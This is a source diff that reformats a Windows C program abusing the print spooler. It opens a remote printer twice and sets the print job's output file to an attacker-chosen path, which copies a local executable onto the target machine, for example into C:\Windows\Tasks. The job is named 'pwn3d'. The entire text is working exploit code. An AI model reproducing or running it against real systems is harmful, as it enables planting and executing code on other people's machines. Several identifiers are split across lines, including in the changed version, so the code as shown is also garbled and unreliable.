@@ -115,118 +115,111 @@ LPTSTR targetFileName;
 LPTSTR target;
 int _tmain(int argc, _TCHAR* argv[])
 {
- 	if(argc != 7) {
+ 	if(argc != 7) 
+	{
  		wprintf_s(_T("\nUsage:\n%s -t target -s localFileNameFullPath -d remoteFileNameFullPath\nExample: %s -t \\\\target\\Printer1 -s C:\\test.exe -d C:\\Windows\\Tasks\\test.exe\n"),argv[0],argv[0]);
  		return 0;
  	}
- for (int i=1;i<argc;i++) {
- if ( (wcslen(argv[i])==2) && (argv[i][0]=='-') ) {
- 	switch (argv[i][1]) {
- 		case 'd': targetFileNa
-			me=argv[i+1]; i=i++; break;
- 		case 's': sourceFileNa
-			me=argv[i+1]; i=i++; break;
- 		case 't':
-			target=argv[i+1]; i=i++; break;
- 		default: wprintf_s(_T("Unknown parameter: %s\n"),argv[i]);
-		return 0;
- 		}
+ 	for (int i=1;i<argc;i++)
+	{
+	 	if ( (wcslen(argv[i])==2) && (argv[i][0]=='-') )
+		{
+	 		switch (argv[i][1])
+			{
+	 			case 'd': targetFileNa
+					me=argv[i+1]; i=i++; break;
+	 			case 's': sourceFileNa
+					me=argv[i+1]; i=i++; break;
+	 			case 't':
+					target=argv[i+1]; i=i++; break;
+	 			default: wprintf_s(_T("Unknown parameter: %s\n"),argv[i]);
+				return 0;
+	 		}
+	 	}
  	}
- }
- copyFileToPrintServer(target);
- return 1;
+	copyFileToPrintServer(target);
+	return 1;
 }
 
-int copyFileToPrintServer(LPTSTR pName) {
- PRINTER_DEFAULTS* pDef = new PRINTER_DEFAULTS;
- pDef->pDatatype = NULL; //_T("RAW");
- pDef->pDevMode = NULL;
- HANDLE hPrinter;
- // YOU HAVE TO CALL IT TWICE!!!!! FIRST HANDLE IS
-ONLY LOCAL.
- pDef->DesiredAccess = PRINTER_ACCESS_USE;
- // First call...
- if(!OpenPrinter(pName,&hPrinter,pDef)) {
- doFormatMessage(GetLastError());
- return 0;
- }
- writeToPrinter(hPrinter);
- // Second call
- OpenPrinter(pName,&hPrinter,pDef);
- writeToPrinter(hPrinter);
- ClosePrinter(hPrinter);
- return 1;
+int copyFileToPrintServer(LPTSTR pName)
+{
+	 PRINTER_DEFAULTS* pDef = new PRINTER_DEFAULTS;
+	 pDef->pDatatype = NULL; //_T("RAW");
+	 pDef->pDevMode = NULL;
+	 HANDLE hPrinter;
+	 // YOU HAVE TO CALL IT TWICE!!!!! FIRST HANDLE IS ONLY LOCAL.
+	 pDef->DesiredAccess = PRINTER_ACCESS_USE;
+	 // First call...
+	 if(!OpenPrinter(pName,&hPrinter,pDef))
+	 {
+		 doFormatMessage(GetLastError());
+		 return 0;
+	 }
+	 writeToPrinter(hPrinter);
+	 // Second call
+	 OpenPrinter(pName,&hPrinter,pDef);
+	 writeToPrinter(hPrinter);
+	 ClosePrinter(hPrinter);
+	 return 1;
 }
 
-
-int writeToPrinter(HANDLE hPrinter) {
- DOC_INFO_1* docInfo1 = new DOC_INFO_1;
-docInfo1->pDocName = _T("pwn3d");
- docInfo1->pOutputFile = targetFileName;
- docInfo1->pDatatype = NULL;
- if(!StartDocPrinter(hPrinter,1,(LPBYTE)docInfo1)) {
- doFormatMessage(GetLastError());
- return 0;
- }
- HANDLE hFile=GetSpoolFileHandle(hPrinter);
- if(hFile==INVALID_HANDLE_VALUE) {
- doFormatMessage(GetLastError());
- return 0;
- }
- DWORD numb = 0;
- numb = copyFileToHandle(hFile);
- if(INVALID_HANDLE_VALUE == (hFile=CommitSpoolData(hP
-rinter,hFile,numb))) {
- doFormatMessage(GetLastError());
- return 0;
- }
- if(!CloseSpoolFileHandle(hPrinter,hFile)) {
- doFormatMessage(GetLastError());
- return 0;
- }
- return 1;
+int writeToPrinter(HANDLE hPrinter)
+{
+	 DOC_INFO_1* docInfo1 = new DOC_INFO_1;
+	 docInfo1->pDocName = _T("pwn3d");
+	 docInfo1->pOutputFile = targetFileName;
+	 docInfo1->pDatatype = NULL;
+	 if(!StartDocPrinter(hPrinter,1,(LPBYTE)docInfo1)) {
+	 	doFormatMessage(GetLastError());
+	 	return 0;
+	 }
+	 HANDLE hFile=GetSpoolFileHandle(hPrinter);
+	 if(hFile==INVALID_HANDLE_VALUE) {
+	 	doFormatMessage(GetLastError());
+	 	return 0;
+	 }
+	 DWORD numb = 0;
+	 numb = copyFileToHandle(hFile);
+	 if(INVALID_HANDLE_VALUE == (hFile=CommitSpoolData(hPrinter,hFile,numb))) {
+		 doFormatMessage(GetLastError());
+		 return 0;
+	 }
+	 if(!CloseSpoolFileHandle(hPrinter,hFile)) {
+		 doFormatMessage(GetLastError());
+		 return 0;
+	 }
+	 return 1;
 }
 
-
-DWORD copyFileToHandle(HANDLE hFile) {
- HANDLE readHandle;
- int iFileLength;
- PBYTE pBuffer;
- DWORD dwBytesRead,dwBytesWritten;
- if(INVALID_HANDLE_VALUE==(readHandle=CreateFile(so
-urceFileName,GENERIC_READ,FILE_SHARE_
-READ,NULL,OPEN_EXISTING,0,NULL)))
- return 0;
- iFileLength = GetFileSize(readHandle,NULL);
- pBuffer = (PBYTE)malloc(iFileLength);
- ReadFile(readHandle,pBuffer,iFileLength,&dwBytesRea
-d,NULL);
- CloseHandle(readHandle);
- WriteFile(hFile,pBuffer,iFileLength,&dwBytesWritten
-,NULL);
- return dwBytesWritten;
+DWORD copyFileToHandle(HANDLE hFile)
+{
+	 HANDLE readHandle;
+	 int iFileLength;
+	 PBYTE pBuffer;
+	 DWORD dwBytesRead,dwBytesWritten;
+	 if(INVALID_HANDLE_VALUE==(readHandle=CreateFile(sourceFileName,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL)))
+	 	return 0;
+	 iFileLength = GetFileSize(readHandle,NULL);
+	 pBuffer = (PBYTE)malloc(iFileLength);
+	 ReadFile(readHandle,pBuffer,iFileLength,&dwBytesRead,NULL);
+	 CloseHandle(readHandle);
+	 WriteFile(hFile,pBuffer,iFileLength,&dwBytesWritten,NULL);
+	 return dwBytesWritten;
 }
 
-
-void doFormatMessage( unsigned int dwLastErr ) {
- LPVOID lpMsgBuf;
- FormatMessage(
- FORMAT_MESSAGE_ALLOCATE_BUFFER |
- FORMAT_MESSAGE_IGNORE_INSERTS |
- FORMAT_MESSAGE_FROM_SYSTEM,
- NULL,
- dwLastErr,
- MAKELANGID( LANG_NEUTRAL, SUBLANG_DEFAULT ),
- (LPTSTR) &lpMsgBuf,
- 0,
- NULL );
- wprintf_s(TEXT("ErrorCode %i: %s"), dwLastErr, lpMsgBuf);
- LocalFree(lpMsgBuf);
+void doFormatMessage( unsigned int dwLastErr )
+{
+	 LPVOID lpMsgBuf;
+	 FormatMessage(
+		 FORMAT_MESSAGE_ALLOCATE_BUFFER |
+		 FORMAT_MESSAGE_IGNORE_INSERTS |
+		 FORMAT_MESSAGE_FROM_SYSTEM,
+		 NULL,
+		 dwLastErr,
+		 MAKELANGID( LANG_NEUTRAL, SUBLANG_DEFAULT ),
+		 (LPTSTR) &lpMsgBuf,
+		 0,
+		 NULL );
+	 wprintf_s(TEXT("ErrorCode %i: %s"), dwLastErr, lpMsgBuf);
+	 LocalFree(lpMsgBuf);
 }
-
-
-
-
-
-
-
